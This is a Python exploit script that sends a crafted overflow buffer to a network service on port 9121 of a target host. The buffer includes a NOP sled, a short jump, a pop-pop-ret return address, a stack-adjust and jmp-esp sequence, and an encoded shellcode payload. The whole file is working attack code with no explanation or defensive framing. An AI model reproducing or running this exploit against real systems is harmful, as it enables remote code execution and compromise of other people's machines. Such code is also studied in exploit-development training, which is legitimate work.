#!/usr/bin/python
import socket
import sys
from struct import pack
try:
    server = sys.argv[1]
    port = 9121
    size= 1000
    shelly = b"\x43" * 400
    shellcode = b"\x90" * 20
    shellcode += b"\xb8\xd5\x93\x90\x27\xd9\xd0\xd9\x74\x24\xf4"
    shellcode += b"\x5b\x33\xc9\xb1\x52\x31\x43\x12\x03\x43\x12"
    shellcode += b"\x83\x16\x97\x72\xd2\x64\x70\xf0\x1d\x94\x81"
    shellcode += b"\x95\x94\x71\xb0\x95\xc3\xf2\xe3\x25\x87\x56"
    shellcode += b"\x08\xcd\xc5\x42\x9b\xa3\xc1\x65\x2c\x09\x34"
    shellcode += b"\x48\xad\x22\x04\xcb\x2d\x39\x59\x2b\x0f\xf2"
    shellcode += b"\xac\x2a\x48\xef\x5d\x7e\x01\x7b\xf3\x6e\x26"
    shellcode += b"\x31\xc8\x05\x74\xd7\x48\xfa\xcd\xd6\x79\xad"
    shellcode += b"\x46\x81\x59\x4c\x8a\xb9\xd3\x56\xcf\x84\xaa"
    shellcode += b"\xed\x3b\x72\x2d\x27\x72\x7b\x82\x06\xba\x8e"
    shellcode += b"\xda\x4f\x7d\x71\xa9\xb9\x7d\x0c\xaa\x7e\xff"
    shellcode += b"\xca\x3f\x64\xa7\x99\x98\x40\x59\x4d\x7e\x03"
    shellcode += b"\x55\x3a\xf4\x4b\x7a\xbd\xd9\xe0\x86\x36\xdc"
    shellcode += b"\x26\x0f\x0c\xfb\xe2\x4b\xd6\x62\xb3\x31\xb9"
    shellcode += b"\x9b\xa3\x99\x66\x3e\xa8\x34\x72\x33\xf3\x50"
    shellcode += b"\xb7\x7e\x0b\xa1\xdf\x09\x78\x93\x40\xa2\x16"
    shellcode += b"\x9f\x09\x6c\xe1\xe0\x23\xc8\x7d\x1f\xcc\x29"
    shellcode += b"\x54\xe4\x98\x79\xce\xcd\xa0\x11\x0e\xf1\x74"
    shellcode += b"\xb5\x5e\x5d\x27\x76\x0e\x1d\x97\x1e\x44\x92"
    shellcode += b"\xc8\x3f\x67\x78\x61\xd5\x92\xeb\x84\x2f\x99"
    shellcode += b"\xe1\xf0\x2d\xa1\xe4\x5c\xbb\x47\x6c\x4d\xed"
    shellcode += b"\xd0\x19\xf4\xb4\xaa\xb8\xf9\x62\xd7\xfb\x72"
    shellcode += b"\x81\x28\xb5\x72\xec\x3a\x22\x73\xbb\x60\xe5"
    shellcode += b"\x8c\x11\x0c\x69\x1e\xfe\xcc\xe4\x03\xa9\x9b"
    shellcode += b"\xa1\xf2\xa0\x49\x5c\xac\x1a\x6f\x9d\x28\x64"
    shellcode += b"\x2b\x7a\x89\x6b\xb2\x0f\xb5\x4f\xa4\xc9\x36"
    shellcode += b"\xd4\x90\x85\x60\x82\x4e\x60\xdb\x64\x38\x3a"
    shellcode += b"\xb0\x2e\xac\xbb\xfa\xf0\xaa\xc3\xd6\x86\x52"
    shellcode += b"\x75\x8f\xde\x6d\xba\x47\xd7\x16\xa6\xf7\x18"
    shellcode += b"\xcd\x62\x17\xfb\xc7\x9e\xb0\xa2\x82\x22\xdd"
    shellcode += b"\x54\x79\x60\xd8\xd6\x8b\x19\x1f\xc6\xfe\x1c"
    shellcode += b"\x5b\x40\x13\x6d\xf4\x25\x13\xc2\xf5\x6f"
    inputBuffer=b"\x41" *124
    inputBuffer+=pack("<L", (0x06eb9090)) #nop,nop jmp 6
    inputBuffer+=pack("<L", (0x101582b0)) #pop esi, pop edp.
    inputBuffer+=b"\x90" * 2 #even out bytes
    inputBuffer+=b"\x66\x81\xc4\xc8\x06"    #add alot to sp 
    inputBuffer+=b"\xff\xe4" #jmp esp
    inputBuffer+=b"\x90" * (size - len(inputBuffer) -len(shellcode))
    inputBuffer+=shellcode
    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    buf = header + inputBuffer
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()
    print("Done!")
except socket.error:
    print("could not connect")
